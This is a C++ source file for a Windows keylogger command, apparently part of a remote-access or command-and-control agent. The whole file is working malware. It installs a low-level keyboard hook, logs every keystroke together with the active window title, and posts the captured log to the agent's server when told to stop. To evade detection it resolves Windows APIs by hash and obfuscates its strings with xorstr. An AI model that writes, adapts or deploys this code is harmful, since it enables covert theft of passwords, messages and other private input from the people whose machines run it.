// ========================================== { START OF FILE } ========================================== //
// Keylogger: captures keystrokes with a low-level keyboard hook and reports them as the JSON event
// log the reference produces.
//
// Ref: clean/test Agent/src/Keylogger.cpp + include/Keylogger.h (commits c36b30a, 011a2d0) — the
// `WH_KEYBOARD_LL` hook, the foreground-window tracking, the `{"type","value","window"}` event
// shape and the JSON array the harvest hands back. This tree had a simplified `GetAsyncKeyState`
// poll in its place (the owner's modular port left a "simplified for now" stub), which blocked the
// agent for 50 s per `start` and captured no window context.
//
// Differences forced by this tree's rules, not by design: every Win32 entry point is resolved by
// hash (no static imports), module-local state replaces the reference's `static Keylogger*`
// singleton, and the worker is a `CreateThread` thread so the message pump the hook needs does not
// drag the C++ runtime's thread machinery in.

#ifdef _WIN32

#include <windows.h>

#include <mutex>
#include <string>

#include "agent/commands/exec/filetransfer.h"
#include "agent/commands/exec/keylogger.h"
#include "agent/util/api_resolver.h"
#include "agent/util/strings.h"
#include "xorstr/xorstr.hpp"

namespace agent::commands::exec {

    namespace {

        /// Every Win32 entry point this command needs, resolved once from user32/kernel32.
        struct WinApi {
            decltype(&SetWindowsHookExW) set_windows_hook = nullptr;
            decltype(&UnhookWindowsHookEx) unhook = nullptr;
            decltype(&CallNextHookEx) call_next_hook = nullptr;
            decltype(&GetForegroundWindow) get_foreground_window = nullptr;
            decltype(&GetWindowTextA) get_window_text = nullptr;
            decltype(&MapVirtualKeyA) map_virtual_key = nullptr;
            decltype(&GetMessageW) get_message = nullptr;
            decltype(&PeekMessageW) peek_message = nullptr;
            decltype(&TranslateMessage) translate_message = nullptr;
            decltype(&DispatchMessageW) dispatch_message = nullptr;
            decltype(&PostThreadMessageW) post_thread_message = nullptr;
            decltype(&GetModuleHandleW) get_module_handle = nullptr;
            decltype(&CreateEventW) create_event = nullptr;
            decltype(&SetEvent) set_event = nullptr;
            decltype(&WaitForSingleObject) wait_for_single_object = nullptr;
            decltype(&CloseHandle) close_handle = nullptr;
            decltype(&CreateThread) create_thread = nullptr;
            decltype(&GetCurrentThreadId) get_current_thread_id = nullptr;

            [[nodiscard]] bool resolved() const {
                return set_windows_hook != nullptr && unhook != nullptr && call_next_hook != nullptr &&
                       get_foreground_window != nullptr && get_window_text != nullptr && map_virtual_key != nullptr &&
                       get_message != nullptr && peek_message != nullptr && translate_message != nullptr &&
                       dispatch_message != nullptr && post_thread_message != nullptr && get_module_handle != nullptr &&
                       create_event != nullptr && set_event != nullptr && wait_for_single_object != nullptr &&
                       close_handle != nullptr && create_thread != nullptr && get_current_thread_id != nullptr;
            }
        };

        /// Resolves the entry points on first use; a failed run leaves `resolved()` false.
        [[nodiscard]] const WinApi& Api() {
            static const WinApi api = [] {
                WinApi resolved;

                const HMODULE user32 = agent::util::get_module(xorstr_("user32.dll"));
                if (user32 == nullptr) {
                    return resolved;
                }

                resolved.set_windows_hook =
                    agent::util::resolve_api<decltype(&SetWindowsHookExW)>(user32, xorstr_("SetWindowsHookExW"));
                resolved.unhook =
                    agent::util::resolve_api<decltype(&UnhookWindowsHookEx)>(user32, xorstr_("UnhookWindowsHookEx"));
                resolved.call_next_hook =
                    agent::util::resolve_api<decltype(&CallNextHookEx)>(user32, xorstr_("CallNextHookEx"));
                resolved.get_foreground_window =
                    agent::util::resolve_api<decltype(&GetForegroundWindow)>(user32, xorstr_("GetForegroundWindow"));
                resolved.get_window_text =
                    agent::util::resolve_api<decltype(&GetWindowTextA)>(user32, xorstr_("GetWindowTextA"));
                resolved.map_virtual_key =
                    agent::util::resolve_api<decltype(&MapVirtualKeyA)>(user32, xorstr_("MapVirtualKeyA"));
                resolved.get_message = agent::util::resolve_api<decltype(&GetMessageW)>(user32, xorstr_("GetMessageW"));
                resolved.peek_message =
                    agent::util::resolve_api<decltype(&PeekMessageW)>(user32, xorstr_("PeekMessageW"));
                resolved.translate_message =
                    agent::util::resolve_api<decltype(&TranslateMessage)>(user32, xorstr_("TranslateMessage"));
                resolved.dispatch_message =
                    agent::util::resolve_api<decltype(&DispatchMessageW)>(user32, xorstr_("DispatchMessageW"));
                resolved.post_thread_message =
                    agent::util::resolve_api<decltype(&PostThreadMessageW)>(user32, xorstr_("PostThreadMessageW"));

                const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
                if (kernel32 == nullptr) {
                    return resolved;
                }

                resolved.get_module_handle =
                    agent::util::resolve_api<decltype(&GetModuleHandleW)>(kernel32, xorstr_("GetModuleHandleW"));
                resolved.create_event =
                    agent::util::resolve_api<decltype(&CreateEventW)>(kernel32, xorstr_("CreateEventW"));
                resolved.set_event = agent::util::resolve_api<decltype(&SetEvent)>(kernel32, xorstr_("SetEvent"));
                resolved.wait_for_single_object =
                    agent::util::resolve_api<decltype(&WaitForSingleObject)>(kernel32, xorstr_("WaitForSingleObject"));
                resolved.close_handle =
                    agent::util::resolve_api<decltype(&CloseHandle)>(kernel32, xorstr_("CloseHandle"));
                resolved.create_thread =
                    agent::util::resolve_api<decltype(&CreateThread)>(kernel32, xorstr_("CreateThread"));
                resolved.get_current_thread_id =
                    agent::util::resolve_api<decltype(&GetCurrentThreadId)>(kernel32, xorstr_("GetCurrentThreadId"));

                return resolved;
            }();

            return api;
        }

        /// The live capture. One keylogger per agent process, as in the reference.
        struct Session {
            std::mutex lock;
            HANDLE hook_thread = nullptr;
            DWORD hook_thread_id = 0;
            HHOOK hook = nullptr;
            HANDLE hook_ready = nullptr;
            bool running = false;

            // JSON event body: the reference starts at "[" and closes with "\n]" on harvest.
            std::string events;
            bool first_event = true;
            std::string current_window;
            HWND last_window = nullptr;

            ~Session() { Release(); }

            /// Closes the thread and event handles and drops the hook state.
            void Release() {
                const WinApi& api = Api();
                if (hook_ready != nullptr && api.close_handle != nullptr) {
                    api.close_handle(hook_ready);
                }
                if (hook_thread != nullptr && api.close_handle != nullptr) {
                    api.close_handle(hook_thread);
                }
                hook_ready = nullptr;
                hook_thread = nullptr;
                hook = nullptr;
                hook_thread_id = 0;
                running = false;
            }
        };

        Session& State() {
            static Session session;
            return session;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// Minimal JSON string escaping for the captured value and window title.
        [[nodiscard]] std::string EscapeJson(const std::string& value) {
            std::string escaped;
            escaped.reserve(value.size());
            for (const char character : value) {
                switch (character) {
                    case '\\':
                        escaped += xorstr_("\\\\");
                        break;
                    case '"':
                        escaped += xorstr_("\\\"");
                        break;
                    case '\n':
                        escaped += xorstr_("\\n");
                        break;
                    case '\r':
                        escaped += xorstr_("\\r");
                        break;
                    case '\t':
                        escaped += xorstr_("\\t");
                        break;
                    default:
                        escaped += character;
                }
            }
            return escaped;
        }

        /// Appends one event to the capture, comma-separating as the reference does.
        void AppendEvent(const char* type, const std::string& value, const std::string& window) {
            Session& state = State();
            std::lock_guard<std::mutex> guard(state.lock);

            if (!state.first_event) {
                state.events += xorstr_(",");
            }

            // Built in steps: xorstr_ yields a char pointer, so two of them cannot be concatenated
            // directly.
            std::string event = xorstr_("\n  {\"type\":\"");
            event += type;
            event += xorstr_("\",\"value\":\"");
            event += EscapeJson(value);
            event += xorstr_("\",\"window\":\"");
            event += EscapeJson(window);
            event += xorstr_("\"}");

            state.events += event;
            state.first_event = false;
        }

        /// Foreground window title, or an empty string when there is none.
        [[nodiscard]] std::string ActiveWindowTitle() {
            const WinApi& api = Api();
            const HWND window = api.get_foreground_window();
            if (window == nullptr) {
                return {};
            }

            char title[256] = {};
            const int written = api.get_window_text(window, title, static_cast<int>(sizeof(title)));
            return written > 0 ? std::string(title, static_cast<std::size_t>(written)) : std::string{};
        }

        /// Maps a virtual-key code to the text the reference records for it.
        [[nodiscard]] std::string DescribeKey(const UINT virtual_key) {
            switch (virtual_key) {
                case VK_RETURN:
                    return xorstr_("(ENTER)\n");
                case VK_BACK:
                    return xorstr_("(BACKSPACE)");
                case VK_SPACE:
                    return " ";
                case VK_TAB:
                    return xorstr_("(TAB)");
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                    return xorstr_("(SHIFT)");
                case VK_CONTROL:
                case VK_LCONTROL:
                    return xorstr_("(CTRL)");
                case VK_ESCAPE:
                    return xorstr_("(ESCAPE)");
                case VK_END:
                    return xorstr_("(END)");
                case VK_HOME:
                    return xorstr_("(HOME)");
                case VK_LEFT:
                    return xorstr_("(LEFT)");
                case VK_UP:
                    return xorstr_("(UP)");
                case VK_RIGHT:
                    return xorstr_("(RIGHT)");
                case VK_DOWN:
                    return xorstr_("(DOWN)");
                case VK_DELETE:
                    return xorstr_("(DELETE)");
                default: {
                    const char key = static_cast<char>(Api().map_virtual_key(virtual_key, MAPVK_VK_TO_CHAR));
                    return key != 0 ? std::string(1, key) : std::string{};
                }
            }
        }

        /// The hook callback. Records a window change when the foreground changes, then the key.
        LRESULT CALLBACK HookProc(const int code, const WPARAM wparam, const LPARAM lparam) {
            const WinApi& api = Api();

            if (code >= 0) {
                Session& state = State();

                // Window switching is part of the capture: a keystroke is only useful with the
                // application it was typed into.
                const HWND window = api.get_foreground_window();
                {
                    std::lock_guard<std::mutex> guard(state.lock);
                    if (window != state.last_window) {
                        state.last_window = window;
                        const std::string title = ActiveWindowTitle();
                        if (title != state.current_window) {
                            state.current_window = title;
                            if (!state.first_event) {
                                state.events += xorstr_(",");
                            }
                            state.events += xorstr_("\n  {\"type\":\"window\",\"value\":\"") +
                                            EscapeJson(state.current_window) + xorstr_("\",\"window\":\"") +
                                            EscapeJson(state.current_window) + xorstr_("\"}");
                            state.first_event = false;
                        }
                    }
                }

                if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
                    const auto* keyboard = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lparam);
                    const std::string key = DescribeKey(keyboard->vkCode);
                    if (!key.empty()) {
                        std::string window_title;
                        {
                            std::lock_guard<std::mutex> guard(state.lock);
                            window_title = state.current_window;
                        }
                        AppendEvent(xorstr_("key"), key, window_title);
                    }
                }
            }

            return api.call_next_hook(nullptr, code, wparam, lparam);
        }

        /// Installs the hook on a worker thread with the message pump it requires, and waits until
        /// that thread reports the hook is live.
        unsigned long WINAPI HookThread(void* /*unused*/) {
            const WinApi& api = Api();
            Session& state = State();

            // A message queue has to exist before another thread can post WM_QUIT to it.
            MSG message{};
            api.peek_message(&message, nullptr, WM_USER, WM_USER, PM_NOREMOVE);

            const HHOOK hook = api.set_windows_hook(WH_KEYBOARD_LL, &HookProc, api.get_module_handle(nullptr), 0);
            {
                std::lock_guard<std::mutex> guard(state.lock);
                state.hook = hook;
                state.hook_thread_id = api.get_current_thread_id();
            }
            api.set_event(state.hook_ready);

            if (hook == nullptr) {
                return 0;
            }

            while (api.get_message(&message, nullptr, 0, 0) > 0) {
                api.translate_message(&message);
                api.dispatch_message(&message);
            }

            api.unhook(hook);
            return 0;
        }

    }  // namespace

    CommandResult Keylogger(const models::CheckinResponse& task) {
        const WinApi& api = Api();
        if (!api.resolved()) {
            return CommandResult::Error(
                xorstr_("Keylogger failed: user32/kernel32 entry points could not be resolved"));
        }

        Session& state = State();

        if (task.operation == xorstr_("start")) {
            {
                std::lock_guard<std::mutex> guard(state.lock);
                if (state.running) {
                    return CommandResult::Ok(xorstr_("Keylogger is already running"));
                }
            }

            {
                std::lock_guard<std::mutex> guard(state.lock);
                state.events.clear();
                state.first_event = true;
                state.current_window.clear();
                state.last_window = nullptr;
                state.hook_ready = api.create_event(nullptr, TRUE, FALSE, nullptr);
                if (state.hook_ready == nullptr) {
                    return CommandResult::Error(xorstr_("Keylogger failed: the hook event could not be created"));
                }
                state.hook_thread = api.create_thread(nullptr, 0, &HookThread, nullptr, 0, &state.hook_thread_id);
                if (state.hook_thread == nullptr) {
                    api.close_handle(state.hook_ready);
                    state.hook_ready = nullptr;
                    return CommandResult::Error(xorstr_("Keylogger failed: the hook thread could not be created"));
                }
                state.running = true;
            }

            // Wait for the worker to install the hook (it signals `hook_ready` either way), so a
            // refused hook is reported on `start` instead of looking like a working capture.
            const DWORD waited = api.wait_for_single_object(state.hook_ready, 5000);

            std::lock_guard<std::mutex> guard(state.lock);
            if (waited != WAIT_OBJECT_0 || state.hook == nullptr) {
                if (state.hook_thread_id != 0) {
                    api.post_thread_message(state.hook_thread_id, WM_QUIT, 0, 0);
                }
                state.Release();
                return CommandResult::Error(
                    xorstr_("Keylogger failed: the WH_KEYBOARD_LL hook could not be installed"));
            }

            return CommandResult::Ok(
                xorstr_("Keylogger started: keystrokes are captured until 'stop', which returns and harvests them"));
        }

        if (task.operation == xorstr_("stop")) {
            DWORD hook_thread_id = 0;
            HANDLE hook_thread = nullptr;
            {
                std::lock_guard<std::mutex> guard(state.lock);
                if (!state.running) {
                    return CommandResult::Error(xorstr_("Keylogger is not running"));
                }
                hook_thread_id = state.hook_thread_id;
                hook_thread = state.hook_thread;
            }

            // The lock is not held across the wait: the worker's hook callback takes it, so holding it
            // here would stall the thread that is being torn down until the timeout.
            api.post_thread_message(hook_thread_id, WM_QUIT, 0, 0);
            api.wait_for_single_object(hook_thread, 3000);

            std::string capture;
            {
                std::lock_guard<std::mutex> guard(state.lock);
                // The reference's envelope: the event body between "[" and "\n]".
                capture = xorstr_("[") + state.events + xorstr_("\n]");
                state.Release();
            }

            const std::string stream_id = std::to_string(task.id);
            const bool harvested = PostStreamData(stream_id, capture);
            const std::string harvest_state =
                harvested ? std::string{} : std::string(xorstr_(" (harvest post failed)"));

            if (capture == xorstr_("[\n]")) {
                return CommandResult::Ok(xorstr_("Keylogger stopped: no keystrokes were captured during the session") +
                                         harvest_state);
            }

            // The capture is returned either way; a failed harvest is stated, never hidden.
            return CommandResult::Ok(capture + harvest_state);
        }

        return CommandResult::Error(xorstr_("Unknown keylogger operation"));
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
